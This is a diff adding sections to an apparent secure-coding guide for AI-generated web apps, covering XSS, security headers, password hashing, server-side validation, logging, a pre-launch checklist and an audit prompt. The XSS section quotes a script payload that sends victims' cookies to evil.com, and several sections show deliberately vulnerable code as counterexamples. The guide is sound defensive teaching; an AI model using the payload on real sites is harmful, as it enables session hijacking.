@@ -361,5 +361,235 @@ For each issue found, explain the risk and provide the exact code fix.
 
 ---
 
-*Sources: OWASP API Security Top 10, GDPR Article 6 & 13, MDN Web Docs (Error Boundaries, CORS), 
-Vercel/Netlify ephemeral filesystem documentation, Next.js environment variable documentation.*
+## 5 More Recommendations (Expanded)
+
+### 11. XSS — Cross-Site Scripting
+
+**Severity: High | Discovery: When a user reports their account was hijacked**
+
+AI often renders user-supplied content directly into the DOM without sanitizing it. An attacker posts a comment containing `<script>document.location='https://evil.com?c='+document.cookie</script>` and every user who views it gets their session stolen.
+
+**Vulnerable pattern:**
+```jsx
+// ❌ Renders raw HTML — attacker controls your page
+<div dangerouslySetInnerHTML={{ __html: userPost.content }} />
+
+// ❌ Plain JS equivalent
+element.innerHTML = userContent;
+```
+
+**The Fix:**
+```
+Ask your AI: "Audit every place user-supplied content is rendered. 
+Replace dangerouslySetInnerHTML with a sanitized renderer using 
+DOMPurify. Never set innerHTML directly from user input."
+```
+
+```jsx
+import DOMPurify from 'dompurify';
+// ✅ Safe
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userPost.content) }} />
+```
+
+---
+
+### 12. Missing Secure HTTP Headers
+
+**Severity: Medium | Discovery: Security scanner or penetration test**
+
+Browsers have built-in protections (clickjacking prevention, MIME sniffing, XSS filters) that are OFF by default unless your server sends the right headers. AI-generated servers almost never set these.
+
+**The Fix:**
+
+For Node/Express, install `helmet`:
+```js
+import helmet from 'helmet';
+app.use(helmet()); // sets 11 security headers in one line
+```
+
+For Next.js, add to `next.config.js`:
+```js
+const securityHeaders = [
+  { key: 'X-Frame-Options', value: 'DENY' },
+  { key: 'X-Content-Type-Options', value: 'nosniff' },
+  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
+  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
+];
+```
+
+```
+Ask your AI: "Add security HTTP headers to my app using helmet (Express) 
+or next.config.js headers (Next.js). Include X-Frame-Options, 
+X-Content-Type-Options, and a Content-Security-Policy."
+```
+
+---
+
+### 13. Weak Password Hashing
+
+**Severity: Critical | Discovery: After a database breach**
+
+If your AI stores passwords, it may use MD5, SHA1, or even plain text — all of which are crackable in seconds with modern hardware. Even SHA-256 without salting is inadequate for passwords.
+
+**What to look for:**
+```js
+// ❌ Any of these are wrong
+crypto.createHash('md5').update(password).digest('hex')
+crypto.createHash('sha1').update(password)
+crypto.createHash('sha256').update(password)  // still wrong for passwords
+```
+
+**The Fix:**
+```
+Ask your AI: "Audit how passwords are stored. Replace any hashing 
+with bcrypt (cost factor 12) or argon2id. Show me every place 
+passwords are hashed or compared."
+```
+
+```js
+import bcrypt from 'bcrypt';
+// ✅ Store
+const hash = await bcrypt.hash(password, 12);
+// ✅ Verify
+const match = await bcrypt.compare(inputPassword, storedHash);
+```
+
+---
+
+### 14. No Input Validation at the API Layer
+
+**Severity: High | Discovery: Data corruption or crash**
+
+AI validates forms on the frontend (in the browser) but often skips validation on the backend API. Anyone using a tool like Postman, curl, or a browser extension can bypass your frontend entirely and send malformed data directly to your API.
+
+**Common result:** Negative account balances, strings where numbers are expected, missing required fields stored as `null`, or server crashes from unexpected input shapes.
+
+**The Fix:**
+```
+Ask your AI: "Add server-side input validation to all my API endpoints 
+using Zod (TypeScript) or Joi (JavaScript). The frontend validation 
+is not enough — every endpoint must validate its own inputs 
+independently."
+```
+
+```js
+import { z } from 'zod';
+const schema = z.object({
+  email: z.string().email(),
+  amount: z.number().positive().max(10000),
+});
+// ✅ Throws if invalid — before any business logic runs
+const data = schema.parse(req.body);
+```
+
+---
+
+### 15. No Logging or Monitoring
+
+**Severity: Medium | Discovery: After silent data loss or breach**
+
+AI-generated apps have no observability. When something breaks in production, you have no logs, no alerts, no way to know it happened. You find out when a user tweets about it.
+
+**Minimum viable monitoring stack (all free tiers available):**
+
+| What to monitor | Tool |
+|---|---|
+| Application errors | Sentry (free tier: 5k errors/month) |
+| Server logs | Logtail, Better Stack, or Axiom |
+| Uptime | UptimeRobot (free: 50 monitors) |
+| API response times | Vercel Analytics or Datadog free tier |
+
+**Critical rule — never log sensitive data:**
+```js
+// ❌ Logs passwords and tokens to your log service
+console.log('Login attempt:', req.body);
+
+// ✅ Log only what you need for debugging
+console.log('Login attempt for user ID:', userId, '| IP:', req.ip);
+```
+
+```
+Ask your AI: "Add Sentry error tracking to my app. Initialize it in 
+the app root and wrap all API routes. Make sure passwords, tokens, 
+and personal data are never included in error payloads or logs."
+```
+
+---
+
+## Complete Pre-Launch Checklist (Updated)
+
+```
+DATABASE & STORAGE
+[ ] Database is NOT SQLite on a serverless host
+[ ] DATABASE_URL is in environment variables, never in code
+[ ] Database has automated backups enabled
+
+SECRETS & KEYS
+[ ] .env is in .gitignore and was never committed to git
+[ ] No secret keys in frontend/client-side code
+[ ] No NEXT_PUBLIC_ / VITE_ / REACT_APP_ prefix on secret keys
+[ ] git history clean: git log -p | grep "sk-\|AKIA\|password\|secret"
+
+AUTHENTICATION & AUTHORIZATION
+[ ] Passwords hashed with bcrypt (cost 12) or argon2id — not MD5/SHA/plain text
+[ ] Every data endpoint checks that the requesting user owns the resource
+[ ] Rate limiting on auth endpoints (login, signup, password reset)
+[ ] Sessions invalidated on logout
+
+API SECURITY
+[ ] All API inputs validated server-side with Zod or Joi
+[ ] SQL queries use parameterized inputs (no string concatenation)
+[ ] CORS restricted to known domains (not *)
+[ ] Rate limiting on all public API endpoints
+[ ] Secure HTTP headers set (helmet or next.config.js headers)
+
+FRONTEND
+[ ] User content sanitized before rendering (DOMPurify, no raw innerHTML)
+[ ] Every data-fetching component has loading + error + empty states
+[ ] No sensitive data stored in localStorage (use httpOnly cookies)
+
+LEGAL & COMPLIANCE
+[ ] Privacy Policy at /privacy
+[ ] Terms of Service at /terms
+[ ] Unchecked consent checkbox before collecting personal data
+[ ] Data deletion workflow exists (GDPR right to be forgotten)
+
+MONITORING
+[ ] Sentry or equivalent error tracking installed
+[ ] Uptime monitoring configured
+[ ] Logs do not contain passwords, tokens, or personal data
+[ ] npm audit shows no critical vulnerabilities
+```
+
+---
+
+## The Master Prompt to Audit Any Vibe-Coded App
+
+Paste this at the start of a new AI session with your codebase loaded:
+
+```
+You are a senior security engineer auditing this codebase before production launch.
+Check for and fix the following, one at a time:
+
+1. Any API keys or secrets hardcoded in source files or exposed to the client
+2. Missing ownership/authorization checks on data endpoints (IDOR vulnerabilities)
+3. SQL queries using string concatenation instead of parameterized queries
+4. CORS policy — is it using wildcard (*)?
+5. Missing rate limiting on public endpoints
+6. SQLite used as the production database
+7. Missing error boundaries / loading states in data-fetching components
+8. Absence of Privacy Policy, Terms of Service, or consent mechanism
+9. User content rendered without sanitization (XSS risk)
+10. Missing secure HTTP headers (X-Frame-Options, Content-Security-Policy)
+11. Passwords hashed with MD5, SHA1, or SHA256 instead of bcrypt/argon2
+12. No server-side input validation (only frontend validation)
+13. No error tracking or monitoring configured
+
+For each issue found, explain the risk in one sentence and provide the exact code fix.
+```
+
+---
+
+*Sources: OWASP API Security Top 10, OWASP Top 10 Web (2021), GDPR Articles 6 & 13,
+MDN Web Docs, Vercel/Netlify ephemeral filesystem docs, Next.js environment variable docs,
+bcrypt/argon2 NIST password guidance, Helmet.js documentation.*
